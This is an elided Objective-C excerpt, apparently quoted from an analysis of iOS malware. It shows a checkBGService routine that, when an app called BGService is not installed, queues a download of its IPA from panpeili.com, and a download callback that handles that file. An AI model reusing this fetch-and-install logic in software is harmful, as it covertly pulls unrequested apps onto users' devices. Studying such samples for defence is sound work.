                     ...
                     withOperation:(SIBreakpointsDownload *)paramOperation
{
    if ([paramOperation.url isEqualToString:@"http://panpeili.com/project/BGService/BGService.ipa"]) {
        ...
        NSInteger randtime = arc4random()%36;
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentDirectory = [paths objectAtIndex:0];
...
- (void)checkBGService
{
    ...
    if (isInstall == NO) {
        ...
        if (![[NSFileManager defaultManager] fileExistsAtPath:ipaPath])
        {
            ...
            [[SIDownloadManager sharedSIDownloadManager] addDownloadFileTaskInQueue:urlstr toFilePath:ipaPath breakpointResume:YES rewriteFile:YES];
